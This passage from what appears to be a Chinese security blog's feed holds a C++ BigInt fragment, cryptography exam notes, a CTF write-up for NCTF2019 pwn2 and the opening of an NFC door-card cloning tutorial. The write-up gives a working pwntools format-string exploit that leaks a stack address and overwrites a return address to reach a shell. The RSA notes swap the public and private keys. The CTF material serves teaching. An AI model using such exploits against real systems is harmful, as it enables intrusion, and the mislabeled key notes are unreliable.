&lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"remainder:"</span> &lt;&lt; a - (a/b)*b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//cout &lt;&lt; "a / b = " &lt;&lt; "0" &lt;&lt; endl &lt;&lt; "remainder:" &lt;&lt; "123456789" &lt;&lt; endl;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"please input x, y, m which stands for x^y mod m:"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line"><span class="function">BigInt <span class="title">x</span><span class="params">(s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line"><span class="function">BigInt <span class="title">y</span><span class="params">(s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line"><span class="function">BigInt <span class="title">m</span><span class="params">(s)</span></span>;</span><br><span class="line"></span><br><span class="line">BigInt ans = <span class="built_in">pow</span>(x, y, m);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">"answer:"</span> &lt;&lt;  ans &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">"answer:(binary)"</span> &lt;&lt;  ans.to_binary_string() &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="project" scheme="https://mrh1s.top/categories/project/"/>
    
    
  </entry>
  
  <entry>
    <title>信息安全数学基础复习提纲</title>
    <link href="https://mrh1s.top/posts/99d2d0ad/"/>
    <id>https://mrh1s.top/posts/99d2d0ad/</id>
    <published>2020-01-04T07:57:34.000Z</published>
    <updated>2020-01-05T07:53:59.752Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>信息安全数学复习</h1><h2 id="初等数论复习">初等数论复习</h2><ol><li><h3 id="整除">整除</h3><p>1.1 整除</p><p>1.2 带余除法</p><p>1.3 最大公因数（最小公倍数）</p><p>​1.3.1 辗转相除法 gcd()</p><p>​1.3.2 欧几里得算法 ax+by=gcd(a,b)</p><p>1.4 素数</p><p>​1.4.1 算数基本定理 任何一个数都可以由若干个素数的乘积表示出来</p><p>​1.4.2 大整数分解，是非常困难的</p></li><li><h3 id="同余">同余</h3><p>2.1 等价关系 +，-，×， (÷ 只有转化为×逆元，用扩展欧几里得算法寻找逆元)</p><p>2.2 剩余类  (比如mod  N )</p><p>​2.2.1 完全剩余系 Zn  |Zn|=n</p><p>​2.2.1.1 x,(a,m)  构造  ax+b</p><p>​2.2.1.2 m1-&gt;x m2-&gt;y, 构造 m1y+m2x  (m1m2)</p><p>​2.2.2 简化剩余系 Z*n  |Z *n|=   φ(n)</p><p>​2.2.2.1 x,(a,m) 构造 ax</p><p>​2.2.2.2  和 2.2.1.2类似</p><p>​也就能够推出 φ(n*m) = φ(n) * φ(m)</p><p>​以及 欧拉定理  a∈Zn, (a,N)＝1    a^φ(N) = 1</p><p>​2.2.3 RSA算法（查看ppt）</p><p>​了解rsa的加密和解密的步骤就ok了</p><p>​2.2.3.1 密钥生成</p><p>​p q   n = p*q</p><p>​φ(n) = Z  = (p-1)(q-1)</p><p>​(e,φ(n))=1    e*d=1(mod(φ(n)))</p><p>​(n,e)  是私钥    (n,d)是公钥 ，利用扩展欧几里得算法算出</p><p>2.3 同余方程</p><p>​一次同余方程 ax =b (mod m)</p><p>​一次同余方程组</p><p>​中国剩余定理  模数m的拆分</p><h2 id="抽象（近世）代数">抽象（近世）代数</h2><h3 id="群">群</h3><ol><li><p>定义： 给定一个集合，这个集合封闭，结合，有单位元，逆元   (Zn,+) (Z*n, ×)</p></li><li><p>指数运算</p><p>n*g = g+g+g++g+g</p><p>g^n = g * g * … * g</p></li><li><p>子群</p><p>(Z*7 mod(7))  {1,2,4} {1,6}  {1,2,3,4,5,6,7}</p><p>证明方法 ab^-1 ∈ H</p></li><li><p>正规子群、陪集、商群、群同态基本定理</p><p>​4.1 正规子群 可以交换</p><p>​4.2 陪集 aH</p><p>​1 {1,6} = {1,6} = 6 {1,6}</p><p>​2 {1,6} = {2,5} = 5 {1,6}</p><p>​3 {1,6} = {3,4} = 4 {1,6}</p><p>​4.3 商群  所有陪集里面一个元素作为单位元，其他陪集之间都存在互为逆元的关系</p><p>​4.4 群同态的基本定理</p><p>​利用核和原群  可形成商群 G/N 与G‘ 同构 ，要学会举例并证明</p><p>​f(x) = 3^x  (mod 7) ，3是一个生成元，构成满射</p><p>​x =0 f(x) = 1</p><p>​x = 6,12, 18… f(x) = 1</p><p>​6Z 就是核</p><p>​Z/6Z 形成的商群 ，与 {Z*7 , ×(mod 7)} 同构</p></li><li><p>​循环群</p><p>第一个生成元、其他生成元、子群推生成元</p><p>{Z*n , ×mod(n)}  |Z *n| = 10 = 2 *5</p><p>​先找到第一个生成元（怎么找？）  a    a^n是生成元  (n,k) = 1  就可找出所有生成元 要会<strong>证明</strong>并且应用</p><p>​2^0=1  <strong>2^1=2</strong>  <strong>2^3 = 8</strong>  2^4 = 5  2^5 =10  2^6 = 9  <strong>2^7 = 7</strong> 2^8 = 3  <strong>2^9 =6</strong></p><p>​2^k ，找与n(10) 互素的 k</p><p>​</p><p>找子群</p><p>​10的因子有 1,2,5,10   ，那么就有四个子群，这四个子群的元素个数分别为1，2，5，10</p><p>​(拉格朗日定理 |G| = |H| [G:H])</p></li></ol></li></ol><p>​(g,h)-&gt;x    g^x = h 离散对数问题，是困难的</p><p>​6. el-gammel算法</p><p>p, Z*p  ,g  , x,  h = g^x</p><p>c1  = g^k   c2 = m 异或 h^k</p><p>c2 异或 c1^x</p><p>m 异或 h ^k 异或 g^kx</p><p>g^xk = g^kx</p><h3 id="环和域">环和域</h3><ol><li>环的定义：集合  交换加群，封闭，结合，满足分配律 ，整环</li></ol><p>​零因子 {Z12,+,×}    3 != 0, 4!=0    但3*4=0</p><p>​除环： 有单位元、非零元、非零元能找到逆元（即交换加群、成群、分配律）</p><p>​整环：单位元、交换、无零因子   {Z,+,×}可以， 但是{2Z,+,×}不行，因为没有单位元</p><p>​域：交换除环， {Zp,+,×}，p为素数的时候可以形成域</p><p>​有限整环</p><ol start="2"><li><p>子环、理想、商环</p><p>​    {Z12, +, ×}</p><p>子环{0,3,6,9} ，它还是一个理想，因为其他所有的子环×它的元素都被他吸收到这个环中了</p><p>商环</p></li></ol><h3 id="多项式环与有限域">多项式环与有限域</h3><p>多项式的除法求余</p><p>辗转相除法求多项式的最大公因式</p><p>GF(2)[x] mod (x^2 + x + 1) 形成一个有限域，共包含 2^3 个数,{0,1,x,x+1,x^2+1, x^2+x+1, x^2 +x}</p><p>同样的，寻找子域</p><h2 id="ECC">ECC</h2><ol><li><p>实数域上的椭圆曲线</p><p>y^2 = x^3 + ax + b</p><p>P(x1,y1) Q(x2,y2)  P + Q (x3,y3)</p><p>λ = (y2-y1)/(x2-x1)  P!=Q</p><p>​  (3* x1^2 + a) / (2 * y1)  P = Q</p><p>x3 = λ² - x1 - x2</p><p>y3 = λ(x1-x3) -y1</p></li><li><p>有限域</p><p>以上所有的运算mod p</p></li><li><p>ECC</p><p>算法步骤</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="notes" scheme="https://mrh1s.top/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>NCTF2019_pwn2心得 &amp; 格式化字符串总结</title>
    <link href="https://mrh1s.top/posts/44593ed6/"/>
    <id>https://mrh1s.top/posts/44593ed6/</id>
    <published>2019-11-26T00:57:45.000Z</published>
    <updated>2019-11-26T14:13:53.103Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>格式化字符串</h1><h2 id="简介">简介</h2><h3 id="简介-2">简介</h3><p>字符串泄露，顾名思义，就是利用一串格式化字符串，来达到泄露程序数据、修改内存数据的目的</p><p><a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">详细文档</a></p><p>==%[parameter] [flags] [field width] [.precision] [length] type==</p><ol><li><p><strong>parameter</strong></p><p>用法：<strong>n$</strong>，表示选择第几个参数，在格式化字符串题目中尤为重要，可以跨参数读取数据</p></li><li><p><strong>flag</strong></p><p>见文档</p></li><li><p><strong>Field Width</strong></p></li><li><p><strong>Precision</strong></p></li><li><p><strong>Length</strong></p><p>指要输出的数据的长度，规定数据的尺寸</p></li></ol><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>hh</code></td><td style="text-align:center">对于整数类型，<code>printf</code> 会输出<strong>一个</strong>字节长度的数据</td></tr><tr><td style="text-align:center"><code>h</code></td><td style="text-align:center">对于整数类型，<code>printf</code> 会输出<strong>两个</strong>字节长度的数据</td></tr><tr><td style="text-align:center"><code>l</code></td><td style="text-align:center">对于整数类型，<code>printf</code> 会输出<strong>四个</strong>字节长度的数据</td></tr><tr><td style="text-align:center"><code>ll</code></td><td style="text-align:center">对于整数类型，<code>printf</code> 会输出<strong>八个</strong>字节长度的数据</td></tr></tbody></table><ol start="6"><li><strong>Type</strong></li></ol><p>对应的是要输出的数据的数据类型，格式</p><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>d</code>, <code>i</code></td><td style="text-align:center">有符号十进制数值<code>int</code>。’<code>%d</code>‘与’<code>%i</code>'对于输出是同义；但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或0时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td style="text-align:center"><code>u</code></td><td style="text-align:center">十进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td style="text-align:center"><code>f</code>, <code>F</code></td><td style="text-align:center"><code>double</code>型输出10进制<a href="https://zh.wikipedia.org/wiki/%E5%AE%9A%E9%BB%9E" target="_blank" rel="noopener">定点</a>表示。’<code>f</code>‘与’<code>F</code>‘差异是表示无穷与NaN时，’<code>f</code>‘输出’<code>inf</code>’, ‘<code>infinity</code>‘与’<code>nan</code>’；’<code>F</code>‘输出’<code>INF</code>’, ‘<code>INFINITY</code>‘与’<code>NAN</code>’。小数点后的数字位数等于精度，最后一位数字<a href="https://zh.wikipedia.org/wiki/%E5%9B%9B%E8%88%8D%E4%BA%94%E5%85%A5" target="_blank" rel="noopener">四舍五入</a>。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td></tr><tr><td style="text-align:center"><code>e</code>, <code>E</code></td><td style="text-align:center"><code>double</code>值，输出形式为10进制的([<code>-</code>]d.ddd <code>e</code>[<code>+</code>/<code>-</code>]ddd). <code>E</code>版本使用的指数符号为<code>E</code>（而不是<code>e</code>）。指数部分至少包含2位数字，如果值为0，则指数部分为<code>00</code>。Windows系统，指数部分至少为3位数字，例如<code>1.5e002</code>，也可用Microsoft版的运行时函数<code>_set_output_format</code> 修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td></tr><tr><td style="text-align:center"><code>g</code>, <code>G</code></td><td style="text-align:center"><code>double</code>型数值，精度定义为全部有效数字位数。当指数部分在<a href="https://zh.wikipedia.org/wiki/%E9%97%AD%E5%8C%BA%E9%97%B4" target="_blank" rel="noopener">闭区间</a> [-4,5] 内，输出为定点形式；否则输出为指数浮点形式。’<code>g</code>‘使用小写字母，’<code>G</code>'使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td></tr><tr><td style="text-align:center"><code>x</code>, <code>X</code></td><td style="text-align:center">16进制<code>unsigned int</code>。’<code>x</code>‘使用小写字母；’<code>X</code>'使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td style="text-align:center"><code>o</code></td><td style="text-align:center">8进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td style="text-align:center"><code>s</code></td><td style="text-align:center">如果没有用l标志，输出<a href="https://zh.wikipedia.org/w/index.php?title=Null%E7%BB%93%E5%B0%BE%E5%AD%97%E7%AC%A6%E4%B8%B2&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">null结尾字符串</a>直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用<code>wcrtomb</code>函数。</td></tr><tr><td style="text-align:center"><code>c</code></td><td style="text-align:center">如果没有用l标志，把int参数转为<code>unsigned char</code>型输出；如果用了l标志，把wint_t参数转为包含两个元素的<code>wchart_t</code>数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。</td></tr><tr><td style="text-align:center"><code>p</code></td><td style="text-align:center"><code>void *</code>型</td></tr><tr><td style="text-align:center"><code>a</code>, <code>A</code></td><td style="text-align:center"><code>double</code>型的16进制表示，&quot;[−]0<strong>x</strong>h.hhhh <strong>p</strong>±d&quot;。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。’<code>a</code>‘使用小写字母，’<code>A</code>'使用大写字母。[<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2#cite_note-2" target="_blank" rel="noopener">2]</a>[<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2#cite_note-3" target="_blank" rel="noopener">3]</a> （C++11流使用<code>hexfloat</code>输出16进制浮点数）</td></tr><tr><td style="text-align:center"><code>n</code></td><td style="text-align:center">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</td></tr><tr><td style="text-align:center"><code>%</code></td><td style="text-align:center">'<code>%</code>'字面值，不接受任何flags, width, precision or length。</td></tr></tbody></table><p>​注意 <strong>n</strong> 这个type，它不会向屏幕中输出数据，而是会在参数所对应的地址上写上上一次 printf 输出的字节数， 配合 <strong>%100c%n</strong> 类型的格式化字符串使用更佳。</p><p>​此处 <strong>100c</strong> 指的是填充输出100个字符，%n 指的是在相应的内存上写上<strong>100这个数据</strong></p><h2 id="一个例子">一个例子</h2><p>@NCTF2019 pwn2</p><p><a href="%5Cuploads%5Cnctf2019_pwn2.7z">nctf2019_pwn2.7z</a></p><h3 id="概览">概览</h3><p>让我们来总览一下程序</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/<span class="built_in">test</span><span class="comment"># checksec pwn_me_2 </span></span><br><span class="line">[*] <span class="string">'/home/mrh929/Desktop/test/pwn_me_2'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>保护全开，尤其是地址随机化，让我们不能定位到代码段的具体位置</p><h3 id="泄漏点分析">泄漏点分析</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initialize();</span><br><span class="line">  input_name();</span><br><span class="line">  memcpy_and_printf();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"pwn me 100 years again,please!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"are you ready?"</span>);</span><br><span class="line">  read_and_printf();</span><br><span class="line">  <span class="keyword">if</span> ( dword_55BA09B090E0 != <span class="number">0x66666666</span> )</span><br><span class="line">    failed();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"enjoy the fun of pwn"</span>);</span><br><span class="line">  getshell();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要关注和read与printf有关的函数。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">input_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to play nctf!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"a little different,have fun."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"but your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_55BA09907C54</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;dest, src, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;dest, src);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序要求我们输入姓名，然后将 src 处的字符串复制到 dest ，并且输出 dest</p><p>但是经过调试，会发现后面这个函数不仅仅输出了那10个字符，而是在其后输出了乱码。</p><p>这个乱码也就是溢出点，是程序栈中的数据。</p><p>注意到 input_name 函数中存在read函数，这个函数仅仅进行了读入操作而并没有任何输出行为。</p><p>还是得经过一番调试，我们才会发现，<strong>buf 处的内存与后文的 dest 内存有一部分重叠，而 dest 的数据又没有进行初始化，导致我们可以直接访问前一个函数所注入的数据</strong></p><blockquote><p>尝试找出溢出点</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[1] Accepting connection from 192.168.244.1...</span><br><span class="line">welcome to play nctf!</span><br><span class="line">a little different,have fun.</span><br><span class="line">but your name:</span><br><span class="line">11112222333344445555</span><br></pre></td></tr></table></figure><p>程序下断点在 <strong>printf</strong> 函数内，IDA 栈检测窗口中：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00007FFFA44EFD08  000055A46A191C94  memcpy_and_printf+40</span><br><span class="line">00007FFFA44EFD10  6E69726170657270  </span><br><span class="line">00007FFFA44EFD18  0A2E2E2E2E2E2E67  </span><br><span class="line">00007FFFA44EFD20  00007F0A35353535  </span><br><span class="line">00007FFFA44EFD28  00007F9077AE8DBD  libc_2.23.so:_IO_setbuffer+BD</span><br><span class="line">00007FFFA44EFD30  00007F9077E3E620  libc_2.23.so:_IO_2_1_stdout_</span><br><span class="line">00007FFFA44EFD38  00007F9077AE681F  libc_2.23.so:_IO_fflush+7F</span><br><span class="line">00007FFFA44EFD40  0000000000000000  </span><br><span class="line">00007FFFA44EFD48  3B62E912D2F58C00  </span><br><span class="line">00007FFFA44EFD50  00007FFFA44EFD60  [stack]:00007FFFA44EFD60</span><br><span class="line">00007FFFA44EFD58  000055A46A191CCD  main+22</span><br><span class="line">00007FFFA44EFD60  000055A46A191D30  init</span><br><span class="line">00007FFFA44EFD68  00007F9077A99830  libc_2.23.so:__libc_start_main+F0</span><br></pre></td></tr></table></figure><p>注意 <strong>00007FFFA44EFD20</strong> ，这个地址保存了我们刚刚输入的数据的后半段：00 00 7F 0A 35 35 35 35</p><p>可以发现，这个数据之前的就是 src 本身的数据，而这个地方就是上一个 <strong>input_name</strong> 函数所带来的数据</p><p>偏移为 4 * 4 = <strong>16</strong></p><p>搜查系统栈，我们发现了一个可以利用的数据</p><blockquote><p>00007FFFA44EFD50  00007FFFA44EFD60  [stack]:00007FFFA44EFD60</p></blockquote><p>这是一个指向栈中的指针，我们可以通过格式化字符串将其所指向的地址泄露</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">16</span> + <span class="string">"%14$lld"</span> </span><br><span class="line"><span class="comment">#注意这是64位程序，函数指针长达8个字节，必须通过%lld泄露</span></span><br><span class="line"><span class="comment">#前16个字节会被src覆盖，问题不大</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'..\n'</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = int(p.recv(<span class="number">15</span>))</span><br></pre></td></tr></table></figure><p>为什么要泄露这个栈中的地址呢？是因为我们发现通过这几个有限的泄露点是不能进行栈溢出的，因为 canary 和动态地址两者 <strong>只能知道其一</strong> 。</p><p>只有通过格式化字符串的方式在第二个泄漏点改变栈中的函数返回地址，从而让程序直接跳过检验内存数据是否为 0x66666666 的过程。</p><p>继续调试，下断点在下一个 printf 函数  ，查看系统栈</p><p><strong>由于不方便调试，我调试了多次，动态地址有所变化，不过不影响观察</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00007FFD56761AB8  000055607F0F1C31  read_and_printf+5B</span><br><span class="line">00007FFD56761AC0  000A303030303030  </span><br><span class="line">00007FFD56761AC8  00007FA8E673781B  libc_2.23.so:_IO_file_overflow+EB</span><br><span class="line">00007FFD56761AD0  000000000000000E  </span><br><span class="line">00007FFD56761AD8  00007FA8E6A82620  libc_2.23.so:_IO_2_1_stdout_</span><br><span class="line">00007FFD56761AE0  000055607F0F1E7F  .rodata:aAreYouReady</span><br><span class="line">00007FFD56761AE8  00007FA8E672C7FA  libc_2.23.so:puts+16A</span><br><span class="line">00007FFD56761AF0  0000000000000000  </span><br><span class="line">00007FFD56761AF8  C275F8AAB68E9400  </span><br><span class="line">00007FFD56761B00  00007FFD56761B10  [stack]:00007FFD56761B10</span><br><span class="line">00007FFD56761B08  000055607F0F1CEF  main+44</span><br><span class="line">00007FFD56761B10  000055607F0F1D30  init</span><br><span class="line">00007FFD56761B18  00007FA8E66DD830  libc_2.23.so:__libc_start_main+F0</span><br></pre></td></tr></table></figure><p>第二行 **00007FFD56761AC0 ** 00 0A 30 30 30 30 30 30 是我输入的数据，直接出现在栈里面了，可以直接通过格式化字符串作为修改内存的一个参数</p><p>倒数第二行 <strong>00007FFD56761B08</strong>  main+44 这个地方是函数的返回地址，我们需要知道，<strong>PIE功能</strong>虽然会改变程序的基地址，但是通常它的最后两个字节也就是<strong>12位地址是不会发生改变的</strong>，利用这一点我们就不用去修改太多数据，最后两个字节即可。</p><p>再进行观察，算出这个地址与之前泄露的栈地址的偏移 为 <strong>-8</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:000055607F0F1CD4                 call    _puts</span><br><span class="line">.text:000055607F0F1CD9                 lea     rdi, aAreYouReady ; &quot;are you ready?&quot;</span><br><span class="line">.text:000055607F0F1CE0                 call    _puts</span><br><span class="line">.text:000055607F0F1CE5                 mov     eax, 0</span><br><span class="line">.text:000055607F0F1CEA                 call    read_and_printf</span><br><span class="line">.text:000055607F0F1CEF                 mov     eax, cs:dword_55607F2F30E0</span><br><span class="line">.text:000055607F0F1CF5                 cmp     eax, 66666666h</span><br><span class="line">.text:000055607F0F1CFA                 jnz     short loc_55607F0F1D14</span><br></pre></td></tr></table></figure><p>查看汇编，发现 0xef 和 0xfa 地址刚好只相差一个字节，可以直接跳过检验数据的过程</p><p>我们便能写出 payload2</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stack_addr -= <span class="number">8</span></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"%250d%8$hhn"</span> + <span class="string">'k'</span>*<span class="number">5</span> + p64(stack_addr)</span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure><p>%250d 是为了填充250个字节</p><p>hh 是选择好的格式，代表以字节写入</p><p>与此类似的还有</p><ol><li><p><strong>h</strong> : 按双字节写入</p></li><li><p><strong>l</strong> : 按四字节写入</p></li><li><p><strong>ll</strong>：按八字节写入</p></li></ol><p>n 代表将前一个格式化字符串所输出的字节数量存入对应的地址中</p><p>补充5个padding的目的是对齐栈，使注入的数据位置正确。</p><h3 id="exp">exp</h3><blockquote><p>完整 exp</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"DEBUG"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'139.129.76.65'</span>,<span class="number">50005</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn_me_2')</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">16</span> + <span class="string">"%14$lld"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'..\n'</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = int(p.recv(<span class="number">15</span>))</span><br><span class="line">success(hex(stack_addr))</span><br><span class="line"><span class="comment"># 0x7ffd3ff3e9c0, the addr of stack</span></span><br><span class="line"></span><br><span class="line">stack_addr -= <span class="number">8</span></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"%250d%8$hhn"</span> + <span class="string">'k'</span>*<span class="number">5</span> + p64(stack_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="nctf20191124" scheme="https://mrh1s.top/categories/write-up/nctf20191124/"/>
    
    
      <category term="Format_String_Exploit" scheme="https://mrh1s.top/tags/Format-String-Exploit/"/>
    
  </entry>
  
  <entry>
    <title>利用pn532使小米手机模拟加密门卡</title>
    <link href="https://mrh1s.top/posts/2b135c76/"/>
    <id>https://mrh1s.top/posts/2b135c76/</id>
    <published>2019-10-31T14:49:16.000Z</published>
    <updated>2020-01-14T08:12:55.176Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p><strong>声明</strong> ：本教程仅供学习交流之用途，本教程不能增加你的饭卡余额，亦不能使你越过他人的门禁系统，仅仅作讨论NFC技术所使用，不得将技术用于非法途径，违法者必将受到处罚！</p></blockquote><h2 id="基础知识">基础知识</h2><h3 id="门卡的分类">门卡的分类</h3><p>如今市面上的卡多分为两种，一种是 <strong>ID Card</strong> ， 一种是 <strong>IC Card</strong> 。</p><p><strong>ID Card</strong> (Identification Card) ，全称身份识别卡，工作频率为 125KHZ。其中能储存的信息只有出厂时自带的 ID卡号，一经出厂，不可修改。由于频段不一样，小米手机无法模拟。</p><p><strong>IC Card</strong> (Integrated Circuit Card)，全称集成电路卡，工作频率 13.56MHz。</p><p>其中拥有 <strong>16个扇区</strong> ，每个扇区拥有 <strong>两个密钥</strong> ，这种类型的卡是小米手机可以模拟的，但能否成功模拟还需要一些运气。（根据机器的好坏，卡片破解的成功率也会有所不同）</p><h3 id="门卡区分">门卡区分</h3><h4 id="ID卡与IC卡">ID卡与IC卡</h4><p><img 